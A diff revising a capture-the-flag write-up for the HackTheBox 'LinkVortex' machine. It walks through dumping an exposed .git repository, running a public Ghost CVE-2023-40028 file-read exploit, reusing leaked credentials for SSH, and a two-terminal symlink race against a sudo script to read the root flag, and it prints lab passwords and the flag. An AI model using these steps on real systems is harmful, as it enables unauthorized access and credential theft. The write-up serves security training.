@@ -1,22 +1,32 @@
 ---
 title: LinkVortex
 author: Julien Bongars
-date: 2026-02-04 03:17:32
+date: 2026-02
+link: "[app.hackthebox.com/machines/LinkVortex](https://app.hackthebox.com/machines/LinkVortex)"
 tags:
   - HackTheBox
   - Easy
   - Linux
   - Hacking
-link: "[app.hackthebox.com/machines/LinkVortex](https://app.hackthebox.com/machines/LinkVortex)"
 ---
 
-ip =
+# LinkVortex — Writeup
 
-# Description
+> Platform: HackTheBox · Difficulty: **Easy** · OS: **Linux**
+> Target: `10.129.193.249` (`linkvortex.htb`)
+> Ref: [app.hackthebox.com/machines/LinkVortex](https://app.hackthebox.com/machines/LinkVortex)
 
-LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed .git directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to CVE-2023-40028. This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access.
+## Summary
 
-# Port scanning
+LinkVortex is an Easy Linux box built around abusable symbolic links. Port 80 redirects to `linkvortex.htb`; vhost discovery surfaces `dev.linkvortex.htb`, which exposes a `.git` directory. Dumping that repo and reviewing the staged (not yet committed) diff yields Ghost CMS credentials. The running Ghost is **5.58.0**, vulnerable to **CVE-2023-40028** — an authenticated symlink-upload arbitrary file read inside the Ghost container. Reading the production config leaks SMTP credentials for `bob@linkvortex.htb`, which reuse as SSH access on the host.
+
+As `bob`, `sudo -l` allows `NOPASSWD` execution of `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png`. That script has a **TOCTOU** race: it checks the symlink target, moves the link into quarantine, then optionally `cat`s it when `CHECK_CONTENT=true`. Flipping the symlink target between a harmless path and `/root/root.txt` across the check/use window prints the root flag. The main time-sinks were fumbling vhost enum, overlooking staged git changes, and staring at the CVE file-read shell without checking the dumped Dockerfile for the config path.
+
+---
+
+## Recon
+
+### Port scanning
 
 **rustscan**
 
@@ -48,25 +58,31 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Feb  4 03:41:43 2026 -- 1 IP address (1 host up) scanned in 6.76 seconds
 ```
 
-we add the IP address to /etc/hosts and run gobuster for vhost discovery
+Two services: SSH and Apache. The redirect to `http://linkvortex.htb/` means the hostname goes in `/etc/hosts` before further web enum. Vhost discovery is next.
 
-# Enumeration
+### Enumeration
 
-## Ghost CMS
+#### Ghost CMS (`linkvortex.htb`)
 
-I found there is an admin page in `http://linkvortex.htb/ghost` I found this by accessing the `robots.txt` file. Digging around I found the `/author/admin` page. I guess `admin` is the username. Nothing interesting.
+`robots.txt` points at the Ghost admin UI at `http://linkvortex.htb/ghost`. Digging further turns up `/author/admin` — suggesting `admin` as a username — but nothing useful without credentials.
 
-## dev.linkvortex.htb
+#### `dev.linkvortex.htb`
 
-I found that there is a `dev.linkvortex.htb` which appears to be a dev page
+Vhost enum finds `dev.linkvortex.htb`, a separate dev page:
 
 ![](.media/20260204050314.png)
 
-digging further (as in reading the description) it looks like `/.git` is exposed. I used `git-dumper` to dump the src but inside the src I found nothing interesting.
+The page description calls out an exposed `/.git`. Dumping it with `git-dumper` lands a working tree that looks empty of secrets at first glance — the interesting material is in the staged changes, not the checkout.
 
-## Source Code
+---
 
-Apparently there are creds for Bob username somewhere but I still don't see anything
+## Stage 1: Exposed `.git` → Ghost admin credentials
+
+```bash
+mkdir src && git-dumper 'http://dev.linkvortex.htb/.git' ./src
+```
+
+`git status` on the dump shows staged but uncommitted changes:
 
 ```bash
 [julien@parrot src]$ git status
@@ -77,8 +93,7 @@ Changes to be committed:
         modified:   ghost/core/test/regression/api/admin/authentication.test.js
 ```
 
-running `git diff --cached HEAD` I get
-there is this password that appears in a file that was added:-
+`git diff --cached HEAD` surfaces a password change in the authentication test, and a Dockerfile pinning Ghost **5.58.0**:
 
 ```bash
 diff --git a/Dockerfile.ghost b/Dockerfile.ghost
@@ -120,9 +135,15 @@ index 2735588..e654b0e 100644
 
 ![](.media/20260204055450.png)
 
-Find out that the version for Ghost CMS is 5.58.0. Doing some digging it's vulnerable to [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)
+Ghost admin accepts `admin@linkvortex.htb` / `OctopiFociPilfer45`. The Dockerfile also tells us the production config lands at `/var/lib/ghost/config.production.json` inside the container — useful for the next stage.
 
-running the exploit.. getting bunch of files
+Stage result: authenticated Ghost admin session; Ghost version **5.58.0**.
+
+---
+
+## Stage 2: CVE-2023-40028 → config read → SSH as bob
+
+Ghost 5.58.0 is vulnerable to [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) (authenticated symlink upload → arbitrary file read in the container). Running the public exploit with the recovered admin creds:
 
 ```bash
 [julien@parrot Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h 'http:
@@ -187,9 +208,11 @@ BUG_REPORT_URL="https://bugs.debian.org/"
 Enter the file path to read (or type 'exit' to quit):
 ```
 
-got stuck here
+### Dead end: blind file reads without a target path
 
-There is a filepath for the ghost config
+`/etc/passwd` confirms a containerised Debian host (`node` user, docker-style hostname in `/etc/hosts`). `/proc/self/cwd/.env` and `/proc/self/environ` return nothing useful. Without a concrete path from the dumped source, the file-read shell is a dead end — the Dockerfile already named the config.
+
+Reading `/var/lib/ghost/config.production.json` (path from `Dockerfile.ghost`) returns:
 
 ```json
 {
@@ -235,15 +258,19 @@ There is a filepath for the ghost config
 "pass": "fibber-talented-worth"
 ```
 
-and we find stupid bob....
-
-HTB says I'm **WRONG** but I got in. Stupid HTB
+Those SMTP credentials reuse over SSH as `bob` / `fibber-talented-worth`:
 
 ![](.media/20260204061544.png)
 
-## Escalation
+![](.media/20260204061136.png)
 
-Running `sudo -l` on bob I get the following:-
+Stage result: SSH session as `bob`. <!-- TODO: user flag value was not captured in the draft -->
+
+---
+
+## Stage 3: clean_symlink.sh TOCTOU → root
+
+`sudo -l` as bob:
 
 ```bash
 bob@linkvortex:~$ sudo -l
@@ -254,7 +281,7 @@ User bob may run the following commands on linkvortex:
     (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
 ```
 
-We find the sudo script in question:-
+The allowed script:
 
 ```bash
 #!/bin/bash
@@ -289,18 +316,9 @@ if /usr/bin/sudo /usr/bin/test -L $LINK;then
 fi
 ```
 
-so there is your race condition but no idea how to trigger it..
+`env_keep+=CHECK_CONTENT` means the `CHECK_CONTENT` variable survives into the sudo invocation. When it is `true`, the script `cat`s the quarantined link after moving it. The security check is a `readlink` + `grep` for `etc|root` on the target — but between that check and the later `cat`, the symlink target can change. That is a classic TOCTOU race.
 
-### The vulnerability:
-
-There's a TOCTOU (time-of-check to time-of-use) race condition between the security check and the cat command.
-The script checks the symlink target with readlink and grep, but then later does cat $QUAR_DIR/$LINK_NAME. Between the move and the cat, or even after the check, the symlink's target could be changed.
-
-### How to exploit it:
-
-The race window is between when grep checks the target and when cat reads the file. You need CHECK_CONTENT=true for the cat to run.
-
-I guess I need to run two terminal sessions like so
+Exploit with two terminals: one flips the symlink between a harmless file and `/root/root.txt`; the other loops the sudo script with `CHECK_CONTENT=true`:
 
 ```bash
 # Terminal 1: Loop creating and switching the symlink
@@ -320,7 +338,7 @@ while true; do
 done
 ```
 
-I got the root flag......
+When the race hits — check sees the harmless target, then the link flips to `/root/root.txt` before `cat` — the root flag prints:
 
 ```bash
 User bob may run the following commands on linkvortex:
@@ -365,53 +383,43 @@ try again
 bob@linkvortex:~$
 ```
 
-# Creds
+Stage result: root flag `da7603fea754840d5d354b2e0495c723`.
 
-Admin page username = admin@linkvortex.htb
-Admin page password = OctopiFociPilfer45
+---
 
-SSH
-"user": "bob",
-"pass": "fibber-talented-worth"
+## Credentials
 
-# References
+| Source | Credential | Notes |
+| --- | --- | --- |
+| `git diff --cached` (auth test) | `admin@linkvortex.htb:OctopiFociPilfer45` | Ghost admin |
+| Ghost `config.production.json` (CVE-2023-40028) | `bob@linkvortex.htb:fibber-talented-worth` | SMTP auth; reuses for SSH as `bob` |
 
--
+---
 
-# To Improve
+## Key lessons
 
-## Fumbled subdomain enumeration
+- **Vhost enum is not optional.** An early ffuf miss delayed `dev.linkvortex.htb`. Prefer a known-good invocation:
+  ```bash
+  ffuf -u 'http://<TARGET>' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+  ```
+- **Dumped `.git` ≠ working tree only.** Secrets lived in staged, uncommitted changes (`git status` / `git diff --cached`), not in the checked-out files. After `git-dumper`, inspect the index.
+- **When you have source and a file-read primitive, read the paths the source names.** The Dockerfile already pointed at `/var/lib/ghost/config.production.json`; blind `/etc/passwd` / `.env` probes wasted time. HTB Guided Mode is not a substitute for reading the material already on disk.
+- **`env_keep` + check-then-use on a symlink is a TOCTOU.** `CHECK_CONTENT=true` enables the `cat`; racing the target past the `etc|root` grep is enough to leak `/root/root.txt`.
 
-I originally fumbled the initial ffuf for subdomain enumeration. Just use
+### What went right
 
-```bash
-ffuf -u 'http://<TARGET>' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-```
+- Checklist habit paid off — `robots.txt` immediately surfaced `/ghost`.
+- Conceptual path was sound (git dump → CVE file read → sudo symlink race); the delays were execution details, not missing ideas. Finished in about 4h30m (02:00–06:30).
 
-to get them properly
+---
 
-## Got stuck on src code enumeration.
+## Tools & cheat sheet
 
-Got stuck enumerating src codebase.
-
-### Fumbled Git Dumper
-
-```bash
-mkdir src && git-dumper 'http://dev.linkvortex.htb/.git' ./src
-```
-
-Make sure you pay attension to tracked changes not yet committed.
-
-## Got stuck could enum LFI didn't know what to cat
-
-You have the src. You can always look for clues there. Actually you also have the description. Before you reach for the video, you con read description for more clues. The "Guided Mode" in HTB is complete bullshit.
-
-man.... it was starring me in the face. I just needed to look left..
-
-![](.media/20260204061136.png)
-
-## Retro
-
-Actually they were not huge mistates. Really it's not like I'm missing anything conceptually wrong. I just need more practice I think. What went right was the checklist, I was able to remember the robots.txt file. Maybe a few more and I can consider writing more checklists for escalation, enumeration, etc...
-
-I should probably celebrate this one though. This is my 2nd box in a row within 2 days. I started this one at 0200 ish and it's 0630 now. I finished it in 4h30m.
+| Tool | Purpose in this box | Key command |
+| --- | --- | --- |
+| `rustscan` / `nmap` | Port / service discovery | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.193.249` |
+| `ffuf` / gobuster | Vhost discovery (`dev.linkvortex.htb`) | `ffuf -u 'http://<TARGET>' -w …/subdomains-top1million-20000.txt` |
+| `git-dumper` | Dump exposed `.git` on dev vhost | `git-dumper 'http://dev.linkvortex.htb/.git' ./src` |
+| `git diff --cached` | Recover staged password / Dockerfile | `git diff --cached HEAD` |
+| CVE-2023-40028 exploit | Authenticated Ghost arbitrary file read | `./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h 'http://linkvortex.htb'` |
+| `sudo` + `clean_symlink.sh` | TOCTOU symlink race → root flag | `CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` |
